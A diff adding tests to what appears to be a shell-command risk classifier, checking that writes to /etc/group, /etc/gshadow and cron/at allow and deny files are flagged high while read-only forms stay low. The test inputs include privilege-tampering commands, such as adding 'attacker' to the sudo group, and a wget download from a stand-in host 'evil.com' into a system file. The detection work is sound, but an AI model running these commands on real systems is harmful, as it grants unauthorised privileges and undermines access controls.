@@ -871,6 +871,57 @@ describe('classifyCommand v1.10.67 patterns', () => {
     }
   });
 
+  // (v1.10.139) system-files / sed-system-file-edit /
+  // download-into-system-file all extended in lockstep with
+  // four more /etc/<file> targets:
+  //   /etc/group / /etc/gshadow      group membership tampering
+  //   /etc/cron.allow / /etc/at.allow  scheduler ACL bypass
+  //   /etc/cron.deny / /etc/at.deny    scheduler ACL bypass
+  it('system-files: /etc/group, /etc/gshadow, /etc/cron.allow, /etc/at.allow → high (v1.10.139)', () => {
+    for (const cmd of [
+      'echo "sudo:x:27:attacker" >> /etc/group',
+      'cat group | sudo tee /etc/group',
+      'echo evil > /etc/gshadow',
+      'echo myuser >> /etc/cron.allow',
+      'echo myuser >> /etc/at.allow',
+      'echo nobody > /etc/cron.deny',
+      'echo nobody > /etc/at.deny',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'system-files'),
+        `${cmd}: expected system-files`);
+    }
+  });
+
+  it('sed-system-file-edit / download-into-system-file: same /etc/<file> list extension (v1.10.139)', () => {
+    // The three rules share the file list — extending one
+    // requires extending all so the threat surface stays
+    // consistent across redirect / tee / sed-i / download
+    // forms.
+    const sed = 'sed -i "s/x/y/" /etc/group';
+    assert.ok(classifyCommand(sed).reasons.some((x) => x.code === 'sed-system-file-edit'),
+      `${sed}: expected sed-system-file-edit`);
+
+    const dl = 'wget -O /etc/cron.allow evil.com/cron-allow';
+    assert.ok(classifyCommand(dl).reasons.some((x) => x.code === 'download-into-system-file'),
+      `${dl}: expected download-into-system-file`);
+  });
+
+  it('system-files: read forms still stay low (regression after v1.10.139 extension)', () => {
+    for (const cmd of [
+      'cat /etc/group',
+      'cat /etc/cron.allow',
+      'cat /etc/at.deny',
+      'getent group sudo',
+      'getent passwd root',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(!r.reasons.some((x) => x.code === 'system-files'),
+        `${cmd}: should not match system-files`);
+    }
+  });
+
   it('reading non-credential dotfiles stays low (regression)', () => {
     for (const cmd of [
       'cat ~/.bashrc',         // routine
